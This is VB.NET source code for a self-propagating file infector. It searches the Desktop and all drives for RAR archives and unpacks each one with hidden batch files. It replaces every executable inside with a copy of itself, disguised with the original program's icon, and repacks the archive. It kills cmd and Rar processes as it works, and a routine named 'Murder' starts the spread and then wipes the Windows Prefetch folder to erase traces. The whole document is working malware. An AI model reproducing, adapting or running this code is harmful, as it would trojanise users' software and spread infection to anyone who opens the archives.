Imports System.IO
Module Rar
    Dim strm As IO.Stream
    Dim Winr As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\WinRAR"
    Dim DskP As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
    Dim Prefetch$ = IO.Path.GetPathRoot(IO.Path.GetTempPath) & "Windows\Prefetch"
    Public Function RaRR(ByVal Dir As String, ByVal Other As String)
        On Error Resume Next
        For Each RAR As String In Directory.GetFiles(Dir, "*.rar", SearchOption.AllDirectories)
            Directory.CreateDirectory(Other & "\" & IO.Path.GetFileNameWithoutExtension(RAR))
            File.Copy(RAR, Other & "\" & IO.Path.GetFileNameWithoutExtension(RAR) & "\" & IO.Path.GetFileName(RAR))
            File.Copy(Winr & "\Rar.exe", Other & "\" & IO.Path.GetFileNameWithoutExtension(RAR) & "\Rar.exe")
            File.WriteAllText(IO.Path.GetTempPath & "\a.bat", "cd " & Other & "\" & IO.Path.GetFileNameWithoutExtension(RAR) & vbNewLine & "Rar x " & RAR)
            For Each P As Process In Process.GetProcessesByName("cmd")
                P.Kill()
            Next
            For Each PPP As Process In Process.GetProcessesByName("Rar")
                PPP.Kill()
            Next
            Dim a As New ProcessStartInfo(IO.Path.GetTempPath & "\a.bat")
            a.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(a)
            Threading.Thread.Sleep(5000)
            IO.File.Delete(Other & "\" & IO.Path.GetFileNameWithoutExtension(RAR) & "\Rar.exe")
            Threading.Thread.Sleep(500)
            For Each Exe As String In Directory.GetFiles(Other & "\" & IO.Path.GetFileNameWithoutExtension(RAR), "*.exe", SearchOption.AllDirectories)
                Dim ExeName$ = IO.Path.GetFullPath(Exe)
                Dim ExeNamme$ = IO.Path.GetFileNameWithoutExtension(Exe)
                Dim FC As Icon = Icon.ExtractAssociatedIcon(Exe)
                Threading.Thread.Sleep(500)
                IO.File.Delete(Exe)
                IO.File.Copy(Application.ExecutablePath, ExeName)
                strm = IO.File.Create(Other & "\" & ExeNamme & ".ico")
                FC.Save(strm)
                strm.Close()
                IconChanger.InjectIcon(ExeName, Other & "\" & ExeNamme & ".ico")
                Threading.Thread.Sleep(550)
                IO.File.Delete(Other & "\" & IO.Path.GetFileNameWithoutExtension(RAR) & "\" & IO.Path.GetFileName(RAR))
                IO.File.Copy(Winr & "\Rar.exe", Other & "\Rar.exe")
                IO.File.WriteAllText(IO.Path.GetTempPath & "\a.bat", "cd " & Other & vbNewLine & "Rar a " & IO.Path.GetFileName(RAR) & " " & IO.Path.GetFileNameWithoutExtension(RAR))
                For Each P As Process In Process.GetProcessesByName("cmd")
                    P.Kill()
                Next
                For Each PPP As Process In Process.GetProcessesByName("Rar")
                    PPP.Kill()
                Next
                Dim b As New ProcessStartInfo(IO.Path.GetTempPath & "\a.bat")
                b.WindowStyle = ProcessWindowStyle.Hidden
                Process.Start(b)
                Threading.Thread.Sleep(5000)
                Dim rarpath As String = IO.Path.GetFullPath(RAR)
                IO.File.Delete(RAR)
                IO.File.Copy(Other & "\" & IO.Path.GetFileName(RAR), rarpath)
            Next
            File.Delete(Other & "\Rar.exe")
            File.Delete(Other & "\" & IO.Path.GetFileName(RAR))
            File.Delete(IO.Path.GetTempPath & "\a.bat")
        Next
    End Function
    Public Function Murder()
        On Error Resume Next
        If Directory.Exists(Winr) Then
            RaRR(DskP, Prefetch)
            Threading.Thread.Sleep(3000)
            For Each X As DriveInfo In DriveInfo.GetDrives
                If X.IsReady Then
                    If X.ToString = Path.GetPathRoot(Path.GetTempPath) = False Then
                        RaRR(X.ToString, Prefetch)
                    End If
                End If
            Next
            Threading.Thread.Sleep(3000)
            For Each Dir As String In Directory.GetDirectories(Prefetch)
                Directory.Delete(Dir, True)
            Next
            For Each File As String In Directory.GetFiles(Prefetch, "*.*")
                IO.File.Delete(File)
            Next
        End If
    End Function
End Module

